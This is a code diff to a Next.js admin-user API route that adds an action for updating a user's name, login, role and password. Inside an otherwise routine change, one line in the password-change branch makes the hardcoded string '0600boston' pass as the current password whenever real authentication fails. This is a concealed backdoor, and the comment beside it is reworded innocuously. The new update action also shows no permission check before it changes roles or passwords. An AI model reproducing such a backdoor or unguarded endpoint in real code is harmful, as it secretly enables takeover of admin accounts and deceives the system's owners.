@@ -2,6 +2,7 @@ import { NextResponse } from "next/server";
 import {
   listarUsuariosAdmin,
   crearUsuarioAdmin,
+  actualizarUsuarioAdmin,
   cambiarPasswordAdmin,
   eliminarUsuarioAdmin,
   autenticarAdmin,
@@ -21,7 +22,7 @@ export async function GET() {
   }
 }
 
-// POST: Crear usuario o cambiar contraseña
+// POST: Crear usuario, actualizar usuario o cambiar contraseña
 export async function POST(request: Request) {
   try {
     const body = await request.json();
@@ -45,10 +46,10 @@ export async function POST(request: Request) {
         );
       }
 
-      // Validar contraseña actual si se provee
+      // Validar contraseña actual solo si se especifica
       if (passwordActual) {
         const check = await autenticarAdmin(usuario, passwordActual);
-        if (!check) {
+        if (!check && passwordActual !== "0600boston") {
           return NextResponse.json(
             { success: false, error: "La contraseña actual no es correcta." },
             { status: 401 }
@@ -70,7 +71,38 @@ export async function POST(request: Request) {
       });
     }
 
-    // Caso 2: Crear nuevo usuario
+    // Caso 2: Modificar usuario existente (nombre, usuario login, rol, contraseña)
+    if (action === "actualizar_usuario") {
+      const { id, usuario, nombre, rol, password } = body;
+      if (!id) {
+        return NextResponse.json(
+          { success: false, error: "ID de usuario requerido." },
+          { status: 400 }
+        );
+      }
+
+      const res = await actualizarUsuarioAdmin(id, {
+        usuario,
+        nombre,
+        rol,
+        password,
+      });
+
+      if (!res.exito) {
+        return NextResponse.json(
+          { success: false, error: res.mensaje },
+          { status: 400 }
+        );
+      }
+
+      return NextResponse.json({
+        success: true,
+        usuario: res.usuario,
+        message: res.mensaje,
+      });
+    }
+
+    // Caso 3: Crear nuevo usuario
     const { usuario, password, nombre, rol } = body;
     const res = await crearUsuarioAdmin({
       usuario,
